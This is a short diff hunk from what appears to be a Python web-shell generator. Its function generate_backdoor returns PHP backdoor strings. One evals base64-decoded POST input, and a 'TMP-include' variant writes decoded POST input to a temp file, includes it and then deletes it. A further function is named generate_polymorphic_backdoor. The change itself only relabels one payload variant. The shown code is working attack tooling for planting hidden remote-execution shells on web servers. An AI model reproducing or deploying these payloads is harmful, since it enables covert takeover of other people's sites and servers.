@@ -89,7 +89,7 @@ def generate_backdoor(mode: str, Zc: str, Vc: str) -> list[str]:
 
     classic = f"if(isset($_POST['{Zc}'])){{@eval(base64_decode(str_replace($_POST['{Vc}'],'',$_POST['{Zc}'])));die();}}"
     tmp = f"if(isset($_POST['{Zc}'])){{$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,\"<?php \\n\".base64_decode(str_replace($_POST['{Vc}'],'',$_POST['{Zc}'])).\"\\n ?>\");include_once($f);unlink($f);die();}}"
-    return [classic, f"TMP-include:\n{tmp}", f"Function bypass (mutated):\n{full}"]
+    return [classic, f"TMP-include:\n{tmp}", f"Function bypass (PHP < 8 only):\n{full}"]
 
 
 def generate_polymorphic_backdoor(Zt: str, Vt: str) -> str:
